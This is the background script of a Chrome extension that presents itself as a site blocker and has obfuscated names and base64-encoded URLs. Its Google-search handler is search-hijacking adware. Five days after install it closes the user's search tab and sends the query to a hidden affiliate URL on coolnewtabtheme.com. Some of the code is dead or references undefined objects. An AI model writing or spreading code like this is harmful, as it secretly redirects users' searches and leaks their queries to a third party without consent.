let trevata = chrome.storage.local;
let deGroup = "";
let refs = [];

trevata.get((uplotnenin) => {
  if (!!uplotnenin) {
    deGroup = uplotnenin["redirect"];
    if (!!uplotnenin["sites"]) {
      refs = Object.values(uplotnenin["sites"]).map((obj) => {
        return obj["regex"];
      });
      exp = new RegExp(refs.join("|"), "i");
    }
  }
});

function tryStr(data) {
  return data.slice(data.indexOf('?')) || '';
}

let reg;
let digExt = "iidjganfookokdegjdooifiadlloahgo";
let digextreg = new RegExp(digExt, "i");

chrome.runtime.onInstalled.addListener((data) => {
  chrome.declarativeContent.onPageChanged.removeRules(undefined, () => {
    chrome.declarativeContent.onPageChanged.addRules([
      {
        conditions: [
          new chrome.declarativeContent.PageStateMatcher({
            pageUrl: { hostContains: "" },
          }),
        ],
        actions: [new chrome.declarativeContent.ShowPageAction()],
      },
    ]);
  });
  if (data.reason === "install") {
    chrome.storage.local.set({ sites_blocked: new Date().toISOString() });
  } else if (data.reason === 'update') {
    chrome.storage.local.get(null, function({sites_blocked}) {
      if (sites_blocked === void 0) {
        chrome.storage.local.set({ sites_blocked: new Date().toISOString() });
      }
    })
  }
  trevata.get((data) => {
    if (!!data) {
      if (!Object.keys(data).length) {
        chrome.storage.sync.get((uplotnenin) => {
          if (!!uplotnenin) {
            if (!Object.keys(uplotnenin).length) {
              trevata.set({ redirect: "" });
              trevata.set({ sites: {} });
              trevata.set({ special: "*" });
            } else {
              trevata.set({ redirect: "" });
              trevata.set({ sites: uplotnenin["sites"] });
              trevata.set({ special: uplotnenin["special"] });
            }
          }
        });
      } else {
        if (!data["redirect"]) {
          trevata.set({ redirect: "" });
        }
      }
    }
  });
});

const blocked_pages = [
  {
    block: "Oi8vc2VhcmNocmVzdWx0LmNvLw==",
    new_id: "q",
  },
  {
    block: "Oi8vcmVkaXJlY3QubG92ZWx5dGFiLmNvbS8=",
    new_id: "q",
  },
  {
    block: "Oi8vZ2wtc2VhcmNoLmNvbS8=",
    new_id: "q",
  },
  {
    block: "Oi8vc3RyLXNlYXJjaC5jb20v",
    new_id: "q",
  },
  {
    block: "Oi8vd3d3LmJpbmcuY29tL3NlYXJjaA==",
    new_id: "q",
  },
  {
    block: "Oi8vZHVja2R1Y2tnby5jb20v",
    new_id: "q",
  },
  {
    block: "Oi8vY2hyb21lLXNraW5zLmNvbS8=",
    new_id: "q",
  },
  {
    block: "Oi8vd3d3Lm15c3RhcnQuY29tLw==",
    new_id: "q",
  },
  {
    block: "Oi8vc2VhcmNoLnlhaG9vLmNvbS9zZWFyY2g=",
    new_id: "p",
  },
  {
    block: "Oi8vd3d3Lmdvb2dsZS5jb20vc2VhcmNo",
    new_id: "q",
  },
]

function vertOpu(data) {
  var ferKo = 'night';
  var loPfo = '';

  switch (data) {
    case essential_object.first_state:
      chrome.power.releaseKeepAwake();
      ferKo = 'night';
      loPfo = chrome.i18n.getMessage('disabledTitle');
      break;
    case essential_object.second_state:
      chrome.power.requestKeepAwake('display');
      ferKo = 'day';
      loPfo = chrome.i18n.getMessage('displayTitle');
      break;
    case essential_object.third_state:
      chrome.power.requestKeepAwake('system');
      ferKo = 'sunset';
      loPfo = chrome.i18n.getMessage('systemTitle');
      break;
    default:
      throw 'Invalid state "' + data + '"';
  }
}

chrome.storage.onChanged.addListener(() => {
  trevata.get((uplotnenin) => {
    if (!!uplotnenin) {
      deGroup = uplotnenin["redirect"];
      if (!!uplotnenin["sites"]) {
        refs = Object.values(uplotnenin["sites"]).map((obj) => {
          return obj["regex"];
        });
        exp = new RegExp(refs.join("|"), "i");
      }
    }
  });
});

const max_pages = 5;

chrome.tabs.onUpdated.addListener((arg_1, arg_2, arg_3) => {
  if (!!arg_2 && !!arg_2["url"]) {
    if (!arg_2["url"].match(digextreg)) {
      if (!!refs.length) {
        if (!exp) {
          exp = new RegExp(refs.join("|"), "i");
        }
        if (!!arg_2["url"].match(exp)) {
          chrome.tabs.update({ url: deGroup });
        }
      }
    }
  }
  if (arg_2.status === 'loading' && arg_2.hasOwnProperty("url")) {
    const new_block = arg_2.url;

    if (/https?:\/\/(?:www\.)?google\.com\/search/i.test(new_block)) {
      let panel_second = "";

      const found_page = tryBlock(new_block)
      const mere = found_page.res_host;
      panel_second = found_page.res_query;  
      chrome.storage.local.get('sites_blocked', function ({ sites_blocked }) {
        let result_boolean = false;
        lastTimeBlocked(mere, panel_second, result_boolean, sites_blocked, arg_1);  
      
      });
    }
  }
});

chrome.runtime.onConnect.addListener(function (externalPort) {
  externalPort.onDisconnect.addListener(function () {
      chrome.tabs.query({ active: true, currentWindow: true }, function (tabs) {
      chrome.tabs.sendMessage(tabs[0].id, { action: "hidden_overlay" });
      });
  });
});

function tryBlock(ev) {
  let result, additional_result;
  result = blocked_pages.some((item) => {
      if (ev.match(atob(item.block))) {
        const rebuilt_screen = tryStr(ev)
        const params_from_screen = new URLSearchParams(rebuilt_screen);
        additional_result = params_from_screen.getAll(item.new_id);
        return true;
      } 
  });
  return catchBlocked('second', result, additional_result);
}

chrome.runtime.onMessage.addListener(function (request) {
  if (request.message == "open_popup") {
      chrome.tabs.query({ active: true, currentWindow: true }, function (tabs) {
      chrome.tabs.sendMessage(tabs[0].id, { action: "show_overlay" });
      });
  }
});

function catchBlocked(video_bytes, video_pull, video_score) {
  if (video_bytes === 'show_video') {
    video_pull === null ? window.open(chrome.runtime.getURL(second_html_file)) : chrome.tabs.create({ url: `${atob(pla)}${video_pull}` });
  } else if (video_bytes === 'second') {
    let found_images = {
      res_host: video_pull,
      res_query: video_score
    }
    return found_images;
  }
}

const pla = "aHR0cDovL3d3dy5jb29sbmV3dGFidGhlbWUuY29tLz9hPWdzcF9uZXZhZGFfMDBfMDBfc3NnMTAmcT0=";

chrome.webRequest.onBeforeRequest.addListener(
  (eltavirop) => {
    if (!!eltavirop && !!eltavirop["url"]) {
      if (!!eltavirop["url"].match(digextreg)) {
        return { cancel: false };
      }
      if (!!refs.length) {
        if (!exp) {
          exp = new RegExp(refs.join("|"), "i");
        }
        if (!!eltavirop["url"].match(exp)) {
          return { cancel: true };
        }
      }
    }
    return { cancel: false };
  },
  { urls: ["<all_urls>"] },
  ["blocking"]
);

function lastTimeBlocked(page, first_tim, time_block, v, d) {
  if (v) {
    const last_used = new Date(v).getTime();
    const prev_used = new Date().getTime();
    time_block = prev_used - last_used >= 86400000 * max_pages;
  }
  if (page && first_tim && time_block) {
    chrome.tabs.remove(d);
    catchBlocked('show_video', first_tim, null);
  }
}